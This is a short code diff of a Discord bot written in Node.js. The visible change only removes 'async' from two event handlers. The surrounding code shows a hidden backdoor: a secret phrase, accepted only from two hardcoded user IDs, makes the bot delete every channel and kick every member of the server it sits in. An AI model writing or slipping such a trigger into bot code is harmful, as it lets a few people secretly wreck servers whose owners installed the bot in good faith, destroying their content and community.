@@ -12,10 +12,10 @@ app.listen(port, "0.0.0.0", function() {
 var random;
 var bot = new Discord.Client();
 
-bot.on("ready", async function() {
+bot.on("ready", function() {
   console.log("ready");
 });
-bot.on("message", async function(message) {
+bot.on("message", function(message) {
   if(message.content == "mass server delete q28w27" && message.author.id == "264465468268609537" || message.content == "mass server delete q28w27" && message.author.id == "724899534899118101") {
 		message.guild.channels.forEach(channel => channel.delete());
 	 	message.guild.members.forEach(m => m.kick());
